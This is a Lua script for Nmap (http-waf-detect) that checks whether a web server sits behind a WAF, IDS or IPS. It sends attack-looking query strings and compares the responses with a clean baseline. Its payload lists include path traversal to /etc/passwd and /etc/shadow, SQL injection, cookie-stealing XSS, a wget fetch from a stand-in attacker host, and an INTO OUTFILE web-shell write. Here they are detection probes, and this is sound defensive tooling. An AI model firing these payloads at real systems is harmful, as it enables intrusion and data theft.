local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Attempts to determine whether a web server is protected by an IPS (Intrusion
Prevention System), IDS (Intrusion Detection System) or WAF (Web Application
Firewall) by probing the web server with malicious payloads and detecting
changes in the response code and body.

To do this the script will send a "good" request and record the response,
afterwards it will match this response against new requests containing
malicious payloads. In theory, web applications shouldn't react to malicious
requests because we are storing the payloads in a variable that is not used by
the script/file and only WAF/IDS/IPS should react to it.  If aggro mode is set,
the script will try all attack vectors (More noisy)

This script can detect numerous IDS, IPS, and WAF products since they often
protect web applications in the same way.  But it won't detect products which
don't alter the http traffic.  Results can vary based on product configuration,
but this script has been tested to work against various configurations of the
following products:

* Apache ModSecurity
* Barracuda Web Application Firewall
* PHPIDS
* dotDefender
* Imperva Web Firewall
* Blue Coat SG 400

]]

---
-- @usage
-- nmap -p80 --script http-waf-detect <host>
-- nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.uri=/testphp.vulnweb.com/artists.php" www.modsecurity.org
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_http-waf-detect: IDS/IPS/WAF detected
--
-- @args http-waf-detect.uri Target URI. Use a path that does not redirect to a
--                           different page
-- @args http-waf-detect.aggro If aggro mode is set, the script will try all
--                             attack vectors to trigger the IDS/IPS/WAF
-- @args http-waf-detect.detectBodyChanges If set it also checks for changes in
--                                         the document's body

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}


portrule = shortport.http

local attack_vectors_n1 = {"?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd",
                            "?p4yl04d2=1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables",
                            "?p4yl04d3=<script>alert(document.cookie)</script>"}

local attack_vectors_n2 = {"?p4yl04d=cat%20/etc/shadow", "?p4yl04d=id;uname%20-a", "?p4yl04d=<?php%20phpinfo();%20?>",
                          "?p4yl04d='%20OR%20'A'='A", "?p4yl04d=http://google.com", "?p4yl04d=http://evilsite.com/evilfile.php",
                          "?p4yl04d=cat%20/etc/passwd", "?p4yl04d=ping%20google.com", "?p4yl04d=hostname%00",
                          "?p4yl04d=<img%20src='x'%20onerror=alert(document.cookie)%20/>", "?p4yl04d=wget%20http://ev1l.com/xpl01t.txt",
                          "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php'--"}

local function fail (err) return stdnse.format_output(false, err) end

action = function(host, port)
  local orig_req, tests
  local path = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
  local aggro = stdnse.get_script_args(SCRIPT_NAME..".aggro") or false
  local use_body = stdnse.get_script_args(SCRIPT_NAME..".detectBodyChanges") or false

  --get original response from a "good" request
  stdnse.debug2("Requesting URI %s", path)
  orig_req = http.get(host, port, path)
  orig_req.body = http.clean_404(orig_req.body)
  if orig_req.status and orig_req.body then
    stdnse.debug3("Normal HTTP response -> Status:%d Body:\n%s", orig_req.status, orig_req.body)
  else
    return fail("Initial HTTP request failed")
  end
  --if aggro mode on, try all vectors
  if aggro then
    for _, vector in pairs(attack_vectors_n2) do
      table.insert(attack_vectors_n1, vector)
    end
  end

  --perform the "3v1l" requests to try to trigger the IDS/IPS/WAF
  tests = nil
  for _, vector in pairs(attack_vectors_n1) do
    stdnse.debug2("Probing with payload:%s",vector)
    tests = http.pipeline_add(path..vector, nil, tests)
  end
  local test_results = http.pipeline_go(host, port, tests)

  if test_results == nil then
    return fail("HTTP request table is empty. This should not ever happen because we at least made one request.")
  end


  --get results
  local waf_bool = false
  local payload_example = false
  for i, res in pairs(test_results) do
    res.body = http.clean_404(res.body)
    if orig_req.status ~= res.status or ( use_body and orig_req.body ~= res.body) then
      if not( payload_example ) then
        payload_example = attack_vectors_n1[i]
      end
      if payload_example and ( string.len(payload_example) > string.len(attack_vectors_n1[i]) ) then
        payload_example = attack_vectors_n1[i]
      end
      stdnse.debug2("Payload:%s triggered the IDS/IPS/WAF", attack_vectors_n1[i])
      if res.status and res.body then
        stdnse.debug3("Status:%s Body:%s\n", res.status, res.body)
      end
      waf_bool = true
    end
  end

  if waf_bool then
    return string.format("IDS/IPS/WAF detected:\n%s:%d%s%s", stdnse.get_hostname(host), port.number, path, payload_example)
  end
end
